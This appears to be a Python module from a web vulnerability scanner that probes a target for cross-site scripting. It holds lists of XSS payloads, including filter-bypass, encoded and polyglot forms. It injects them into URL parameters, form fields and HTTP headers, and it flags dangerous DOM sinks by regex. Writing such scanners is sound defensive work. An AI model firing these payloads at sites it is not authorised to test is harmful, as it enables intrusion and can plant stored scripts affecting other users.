"""
Cross-Site Scripting (XSS) Scanner
OWASP A3:2021 — Injection / A7:2017 — XSS
CWE-79: Improper Neutralization of Input During Web Page Generation

Tests for:
  - Reflected XSS (GET parameters, form inputs)
  - Stored XSS (form submissions)
  - DOM-based XSS hints
  - XSS in HTTP headers (User-Agent, Referer, X-Forwarded-For)
  - Template injection / polyglot probes
"""

import re
from urllib.parse import quote
from .base import BaseScanner, Finding

# ── Payloads ──────────────────────────────────────────────────────────────────

REFLECTED_XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    # Filter bypass variants
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=alert`1`>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Encoded
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    # Attribute injection
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\"><img src=x onerror=alert(1)>",
    # JS context injection
    "';alert(1)//",
    "\";alert(1)//",
    "</script><script>alert(1)</script>",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
]

HEADER_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
]

DOM_SINK_PATTERNS = [
    r"document\.write\s*\(",
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"eval\s*\(",
    r"setTimeout\s*\(",
    r"setInterval\s*\(",
    r"location\.href\s*=",
    r"location\.hash",
    r"document\.URL",
    r"document\.referrer",
    r"window\.location",
]

REFLECTED_INDICATORS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "onerror=alert",
    "onload=alert",
]


class XSSScanner(BaseScanner):
    """Scans for Cross-Site Scripting (XSS) vulnerabilities."""

    SCANNER_NAME = "Cross-Site Scripting (XSS)"
    OWASP_CATEGORY = "A03:2021"
    CWE = "CWE-79"

    def run(self) -> list[Finding]:
        self.logger.info(f"Starting XSS scan against {self.target}")

        # Reflected XSS via URL params
        params = self.get_query_params(self.target)
        for param in params:
            self._test_reflected_xss(self.target, param)

        # XSS via forms (reflected + stored)
        forms = self.get_forms(self.target)
        for form in forms:
            self._test_form_xss(form)

        # Common endpoints that often have reflection
        probe_endpoints = [
            f"{self.target}/search?q=XSSTEST",
            f"{self.target}/?s=XSSTEST",
            f"{self.target}/index.php?page=XSSTEST",
            f"{self.target}/error?msg=XSSTEST",
            f"{self.target}/redirect?url=XSSTEST",
        ]
        for ep in probe_endpoints:
            ep_params = self.get_query_params(ep)
            for param in ep_params:
                self._test_reflected_xss(ep, param)

        # XSS in HTTP headers
        self._test_header_xss()

        # DOM-based XSS detection
        self._detect_dom_sinks()

        return self.findings

    def _test_reflected_xss(self, url: str, param: str):
        """Test GET parameter for reflected XSS."""
        for payload in REFLECTED_XSS_PAYLOADS:
            test_url = self.inject_param(url, param, payload)
            resp, evidence = self.http.get(test_url)
            if resp is None:
                continue

            # Check if payload appears unencoded in response
            if self._payload_reflected(payload, resp.text):
                self.add_finding(Finding(
                    title="Reflected Cross-Site Scripting (XSS)",
                    severity="HIGH",
                    owasp="A03:2021",
                    cwe="CWE-79",
                    cvss_score=7.4,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                    url=url,
                    parameter=param,
                    payload=payload,
                    description=(
                        f"The parameter `{param}` reflects user input into the HTML response without "
                        "proper encoding or sanitisation. An attacker can craft a malicious URL that "
                        "executes arbitrary JavaScript in victims' browsers."
                    ),
                    impact=(
                        "Session hijacking, credential theft, malware delivery, "
                        "UI redress (clickjacking), defacement."
                    ),
                    remediation=(
                        "HTML-encode all user-supplied data before rendering: "
                        "use context-appropriate escaping (HTML, JS, CSS, URL). "
                        "Implement a strict Content Security Policy (CSP). "
                        "Use modern frameworks with auto-escaping (React, Angular, Vue)."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/xss/",
                        "https://cwe.mitre.org/data/definitions/79.html",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                    ],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="xss",
                ))
                return  # one confirmed finding per parameter

    def _payload_reflected(self, payload: str, body: str) -> bool:
        """Return True if the raw payload (or key parts) appears in the response body."""
        # Direct reflection
        if payload in body:
            return True
        # Key indicator tags reflected
        for ind in REFLECTED_INDICATORS:
            if ind.lower() in body.lower():
                return True
        return False

    def _test_form_xss(self, form: dict):
        """Test form fields for reflected and potentially stored XSS."""
        action = form.get("action", self.target)
        method = form.get("method", "get")
        inputs = form.get("inputs", [])

        for inp in inputs:
            name = inp.get("name", "")
            if not name or inp.get("type") in ("hidden", "submit", "button", "checkbox", "radio"):
                continue

            for payload in REFLECTED_XSS_PAYLOADS[:8]:
                data = {i.get("name", ""): i.get("value", "test") for i in inputs if i.get("name")}
                data[name] = payload

                if method == "post":
                    resp, evidence = self.http.post(action, data=data)
                else:
                    from urllib.parse import urlencode
                    resp, evidence = self.http.get(f"{action}?{urlencode(data)}")

                if resp is None:
                    continue

                if self._payload_reflected(payload, resp.text):
                    self.add_finding(Finding(
                        title="Reflected XSS via Form Input",
                        severity="HIGH",
                        owasp="A03:2021",
                        cwe="CWE-79",
                        cvss_score=7.4,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                        url=action,
                        parameter=name,
                        payload=payload,
                        description=f"Form field `{name}` at `{action}` reflects XSS payloads.",
                        impact="Session theft, credential harvesting, phishing.",
                        remediation="Encode output. Implement CSP. Validate input server-side.",
                        references=["https://owasp.org/www-community/attacks/xss/"],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="xss",
                    ))
                    return

                # Stored XSS hint — payload submitted successfully but not in immediate response
                if resp.status_code in (200, 201, 302) and payload not in resp.text:
                    self.add_finding(Finding(
                        title="Potential Stored XSS — Payload Accepted",
                        severity="HIGH",
                        owasp="A03:2021",
                        cwe="CWE-79",
                        cvss_score=8.0,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
                        url=action,
                        parameter=name,
                        payload=payload,
                        description=(
                            f"Field `{name}` accepted a script payload without rejection. "
                            "Verify manually that the payload is stored and rendered to other users."
                        ),
                        impact="If stored: persistent XSS affecting all users who view the content.",
                        remediation="Sanitize and encode stored data before rendering. Use allowlist-based HTML filters.",
                        references=["https://owasp.org/www-community/attacks/xss/#stored-xss-attacks"],
                        evidence=evidence,
                        confirmed=False,
                        vuln_type="xss",
                    ))
                    return

    def _test_header_xss(self):
        """Test HTTP headers that may be logged/reflected (User-Agent, Referer, etc.)."""
        headers_to_test = {
            "User-Agent": HEADER_XSS_PAYLOADS[0],
            "Referer": HEADER_XSS_PAYLOADS[0],
            "X-Forwarded-For": HEADER_XSS_PAYLOADS[0],
            "X-Original-URL": HEADER_XSS_PAYLOADS[1],
        }
        for header, payload in headers_to_test.items():
            resp, evidence = self.http.get(self.target, headers={header: payload})
            if resp is None:
                continue
            if payload in resp.text:
                self.add_finding(Finding(
                    title=f"Reflected XSS via HTTP Header ({header})",
                    severity="MEDIUM",
                    owasp="A03:2021",
                    cwe="CWE-79",
                    cvss_score=6.1,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                    url=self.target,
                    parameter=header,
                    payload=payload,
                    description=(
                        f"The `{header}` request header value is reflected in the response without encoding."
                    ),
                    impact="XSS exploitable when an attacker controls the header (e.g., via MITM or admin log pages).",
                    remediation="HTML-encode header values before including them in responses.",
                    references=["https://owasp.org/www-community/attacks/xss/"],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="xss",
                ))

    def _detect_dom_sinks(self):
        """Detect dangerous JavaScript DOM sinks that may enable DOM XSS."""
        resp, _ = self.http.get(self.target)
        if resp is None:
            return
        body = resp.text
        found_sinks = []
        for pattern in DOM_SINK_PATTERNS:
            if re.search(pattern, body):
                found_sinks.append(pattern.split(r"\\")[0].replace("\\s*", "").replace("\\(", "("))

        if found_sinks:
            self.add_finding(Finding(
                title="Potential DOM-Based XSS — Dangerous Sink Detected",
                severity="MEDIUM",
                owasp="A03:2021",
                cwe="CWE-79",
                cvss_score=6.1,
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
                url=self.target,
                parameter="JavaScript DOM",
                payload="(static analysis)",
                description=(
                    f"The page source contains dangerous JavaScript DOM sinks: "
                    f"{', '.join(found_sinks)}. "
                    "These can enable DOM-based XSS if they process URL fragment (#), "
                    "query parameters, or postMessage data without sanitisation."
                ),
                impact="DOM XSS can bypass server-side encoding and execute in victim browsers.",
                remediation=(
                    "Avoid document.write, innerHTML. "
                    "Use textContent or innerText for non-HTML output. "
                    "Sanitize inputs with DOMPurify before passing to dangerous sinks."
                ),
                references=[
                    "https://portswigger.net/web-security/cross-site-scripting/dom-based",
                    "https://github.com/cure53/DOMPurify",
                ],
                confirmed=False,
                vuln_type="xss",
            ))
